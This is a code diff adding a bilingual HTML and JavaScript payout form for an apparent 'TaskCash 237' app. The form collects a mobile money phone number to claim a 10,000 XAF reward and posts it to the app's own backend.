@@ -1,0 +1,84 @@
+<!-- Updated Front-end Snippet featuring your custom logo -->
+<div class="payout-container" style="text-align: center; margin: 20px auto; padding: 20px; font-family: sans-serif; max-width: 500px;">
+    
+    <!-- App Logo Section -->
+    <div style="margin-bottom: 20px;">
+        <img src="logo.png" alt="TaskCash 237 Logo" style="width: 100%; max-width: 250px; height: auto; border-radius: 8px;">
+    </div>
+
+    <!-- Language Toggle Buttons -->
+    <div style="margin-bottom: 25px;">
+        <button onclick="setLanguage('en')" style="padding: 6px 12px; margin: 0 5px; cursor: pointer; border: 1px solid #ccc; border-radius: 4px; background: #fff; font-weight: bold;">English</button>
+        <button onclick="setLanguage('fr')" style="padding: 6px 12px; margin: 0 5px; cursor: pointer; border: 1px solid #ccc; border-radius: 4px; background: #fff; font-weight: bold;">Français</button>
+    </div>
+
+    <!-- Dynamic Titles -->
+    <h2 id="payoutTitle" style="color: #1b4332; margin-bottom: 5px;">Claim Your 10,000 XAF Reward</h2>
+    <p id="payoutSubtitle" style="color: #666; font-size: 14px; margin-top: 0; margin-bottom: 20px;">Enter your mobile money number starting with 237</p>
+
+    <!-- Form Input Fields -->
+    <input type="tel" id="phoneInput" placeholder="e.g., 237677777777" style="padding: 12px; width: 85%; max-width: 300px; font-size: 16px; margin-bottom: 15px; border-radius: 6px; border: 2px solid #1b4332; outline: none;"><br>
+    
+    <button onclick="requestPayout()" id="claimBtn" style="padding: 14px 28px; background-color: #ffaa00; color: white; border: none; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
+        Withdraw Balance
+    </button>
+</div>
+
+<script>
+let currentLang = 'en';
+const translations = {
+    en: {
+        title: "Claim Your 10,000 XAF Reward",
+        subtitle: "Enter your mobile money number starting with 237",
+        button: "Withdraw Balance",
+        loading: "Processing payment...",
+        connError: "Connection error occurred. Please try again."
+    },
+    fr: {
+        title: "Réclamez Votre Récompense de 10 000 XAF",
+        subtitle: "Entrez votre numéro de téléphone mobile money commençant par 237",
+        button: "Retirer le solde",
+        loading: "Traitement du paiement...",
+        connError: "Une erreur de connexion est survenue. Veuillez réessayer."
+    }
+};
+
+function setLanguage(lang) {
+    currentLang = lang;
+    document.getElementById('payoutTitle').innerText = translations[lang].title;
+    document.getElementById('payoutSubtitle').innerText = translations[lang].subtitle;
+    document.getElementById('claimBtn').innerText = translations[lang].button;
+}
+
+async function requestPayout() {
+    const userPhone = document.getElementById('phoneInput').value;
+    const claimBtn = document.getElementById('claimBtn');
+    
+    claimBtn.disabled = true;
+    claimBtn.innerText = translations[currentLang].loading;
+
+    const BACKEND_URL = 'https://taskcash-backend.onrender.com/api/payout';
+
+    try {
+        const response = await fetch(BACKEND_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phoneNumber: userPhone })
+        });
+        
+        const data = await response.json();
+        
+        if (response.ok) {
+            alert(data[currentLang]);
+        } else {
+            alert(data[currentLang]);
+        }
+    } catch (error) {
+        alert(translations[currentLang].connError);
+    } finally {
+        claimBtn.disabled = false;
+        claimBtn.innerText = translations[currentLang].button;
+    }
+}
+  </script>
+  
